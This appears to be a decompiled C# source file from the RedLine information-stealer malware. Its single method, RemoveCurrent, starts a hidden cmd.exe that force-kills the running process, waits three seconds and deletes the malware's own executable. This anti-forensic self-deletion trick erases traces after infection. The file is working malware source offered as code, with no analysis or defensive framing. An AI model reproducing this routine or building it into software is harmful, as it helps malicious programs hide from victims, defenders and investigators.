using System;
using System.Diagnostics;
using System.Reflection;

namespace RedLine.Logic.Others
{
	// Token: 0x0200004F RID: 79
	public static class InstallManager
	{
		// Token: 0x060001EB RID: 491 RVA: 0x00007E0C File Offset: 0x0000600C
		public static void RemoveCurrent()
		{
			Process.Start(new ProcessStartInfo
			{
				Arguments = string.Format("/C taskkill /F /PID {0} && choice /C Y /N /D Y /T 3 & Del \"{1}\"", Process.GetCurrentProcess().Id, Assembly.GetExecutingAssembly().Location),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = "cmd.exe",
				RedirectStandardOutput = true,
				UseShellExecute = false
			}).WaitForExit();
		}
	}
}
